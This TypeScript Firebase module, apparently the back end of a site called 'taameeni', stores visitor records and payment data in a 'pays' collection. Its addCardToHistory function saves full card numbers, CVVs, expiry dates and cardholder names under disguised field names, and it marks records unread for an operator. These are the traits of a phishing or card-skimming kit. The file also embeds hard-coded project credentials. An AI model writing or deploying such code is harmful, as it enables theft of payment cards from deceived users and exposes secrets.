import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
import { getFirestore, Firestore, doc, setDoc, updateDoc, arrayUnion } from "firebase/firestore";
import { getDatabase, Database } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyB-qlb_QYAPBqijr00XN-PeUd9DTzI0MDs",
  authDomain: "taameeni-v1.firebaseapp.com",
  databaseURL: "https://taameeni-v1-default-rtdb.firebaseio.com",
  projectId: "taameeni-v1",
  storageBucket: "taameeni-v1.firebasestorage.app",
  messagingSenderId: "240999338900",
  appId: "1:240999338900:web:bb73a1ea1239d2c074f581",
  measurementId: "G-MP49WZ65T2"
};

let app: FirebaseApp | null = null;
let db: Firestore | null = null;
let database: Database | null = null;

if (firebaseConfig.apiKey && firebaseConfig.projectId) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
  database = getDatabase(app);
}

export async function addData(data: any) {
  if (typeof localStorage !== "undefined") {
    localStorage.setItem("visitor", data.id);
  }
  if (!db) return;
  try {
    const docRef = doc(db, "pays", data.id);
    await setDoc(docRef, {
      ...data,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isUnread: true,
    }, { merge: true });
  } catch (e) {
    console.error("Error adding document:", e);
  }
}

export async function updateLastActive(visitorId: string) {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    await updateDoc(docRef, {
      lastActiveAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
  } catch (e) {
    console.error("Error updating lastActiveAt:", e);
  }
}

export async function addCardToHistory(
  visitorId: string,
  cardData: { cardNumber: string; cvv: string; expiryDate: string; cardName: string }
) {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    const entry = {
      id: Date.now().toString(),
      type: "_t1",
      timestamp: new Date().toISOString(),
      status: "pending",
      data: {
        _v1: cardData.cardNumber,
        _v2: cardData.cvv,
        _v3: cardData.expiryDate,
        _v4: cardData.cardName,
      },
    };
    await updateDoc(docRef, {
      history: arrayUnion(entry),
      cardStatus: "pending",
      updatedAt: new Date().toISOString(),
      isUnread: true,
    });
  } catch (e) {
    console.error("Error adding card to history:", e);
  }
}

export { db, database, doc, setDoc, updateDoc, arrayUnion };
